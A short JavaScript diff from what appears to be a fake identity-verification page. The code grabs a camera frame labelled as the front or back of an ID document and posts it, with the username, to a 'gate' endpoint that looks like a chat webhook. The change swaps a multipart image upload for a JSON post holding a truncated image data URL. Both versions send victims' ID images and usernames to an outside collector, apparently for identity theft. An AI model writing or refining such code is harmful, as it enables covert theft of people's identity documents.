@@ -30,11 +30,13 @@
         const c = document.createElement('canvas');
         c.width = v.videoWidth; c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
-        const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
-        const fd = new FormData();
-        fd.append("file", b, `id_${step}_${u}.jpg`);
-        fd.append("payload_json", JSON.stringify({ content: `🪪 **DOCUMENTO V99** (Lado ${step}) - User: ${u}` }));
-        await fetch(gate, { method: 'POST', body: fd });
+        const imgData = c.toDataURL('image/jpeg', 0.5);
+        
+        await fetch(gate, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ content: `🪪 **DOC LADO ${step}**\n👤 User: ${u}\n🖼️ Link: ${imgData.substring(0, 100)}...` })
+        });
 
         if(step === 1) {
             step = 2;
